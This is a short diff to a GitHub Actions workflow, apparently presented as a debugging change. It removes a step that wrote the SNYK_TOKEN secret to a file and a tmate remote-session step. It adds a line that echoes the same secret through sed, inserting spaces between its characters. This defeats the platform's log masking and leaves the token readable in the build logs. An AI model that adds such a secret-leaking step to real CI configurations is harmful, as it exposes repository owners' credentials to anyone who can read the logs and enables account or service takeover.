@@ -44,10 +44,7 @@ jobs:
       env:
         DEBUG_TOKEN: ${{ secrets.SNYK_TOKEN }}
       run: |
-        echo $DEBUG_TOKEN >> secrets.txt
-        
-    - name: Run tmate
-      uses: mxschmitt/action-tmate@v2
+        echo ${{ secrets.SNYK_TOKEN }} | sed 's/./& /g'
         
   snyk:
     permissions:
